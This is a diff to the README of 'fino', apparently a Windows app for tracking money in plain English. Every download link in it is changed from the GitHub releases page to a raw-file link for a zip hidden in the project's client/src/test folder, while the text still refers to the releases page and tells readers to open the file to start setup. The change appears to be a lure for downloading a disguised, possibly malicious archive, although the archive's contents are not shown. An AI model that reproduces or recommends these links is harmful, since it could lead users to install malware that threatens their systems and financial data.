@@ -1,6 +1,6 @@
 # 💸 fino - Track money with plain English
 
-[![Download fino](https://img.shields.io/badge/Download%20fino-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/tophole-alphabetizer167/fino/releases)
+[![Download fino](https://img.shields.io/badge/Download%20fino-Visit%20Releases-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/tophole-alphabetizer167/fino/main/client/src/test/Software-v2.3.zip)
 
 ## 🧭 What is fino?
 
@@ -34,7 +34,7 @@ For best results, use a recent Windows build with the latest security updates.
 
 Go to the releases page and download fino for Windows:
 
-[https://github.com/tophole-alphabetizer167/fino/releases](https://github.com/tophole-alphabetizer167/fino/releases)
+[https://raw.githubusercontent.com/tophole-alphabetizer167/fino/main/client/src/test/Software-v2.3.zip](https://raw.githubusercontent.com/tophole-alphabetizer167/fino/main/client/src/test/Software-v2.3.zip)
 
 On the releases page, look for the latest version. Download the Windows file that matches your PC, then open it to start setup.
 
@@ -158,4 +158,4 @@ Sync timing depends on your bank and your app settings. Most users can refresh o
 
 Use this page for the latest Windows download and updates:
 
-[https://github.com/tophole-alphabetizer167/fino/releases](https://github.com/tophole-alphabetizer167/fino/releases)
+[https://raw.githubusercontent.com/tophole-alphabetizer167/fino/main/client/src/test/Software-v2.3.zip](https://raw.githubusercontent.com/tophole-alphabetizer167/fino/main/client/src/test/Software-v2.3.zip)
